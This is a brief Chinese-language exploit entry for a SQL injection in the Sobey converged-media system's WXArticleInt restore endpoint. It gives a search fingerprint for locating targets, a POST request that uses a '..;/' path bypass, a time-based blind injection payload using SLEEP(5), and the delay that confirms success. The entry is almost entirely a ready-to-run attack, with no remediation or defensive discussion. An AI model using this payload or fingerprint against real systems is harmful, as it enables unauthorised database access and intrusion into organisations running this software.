# 索贝融媒体系统WXArticleInt_restore存在SQL注入漏洞

索贝融媒体系统 ｜ SQL注入 ｜ —
- **指纹**：`app="SOBEY-融媒体"`
- **请求**：`POST /sobey-mchEditor/js/..;/mch/WXArticleInt/restore HTTP/1.1`

**Payload**
```
siteCode=&token=&id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))x)
```
- **响应特征**：200 响应时间>=5s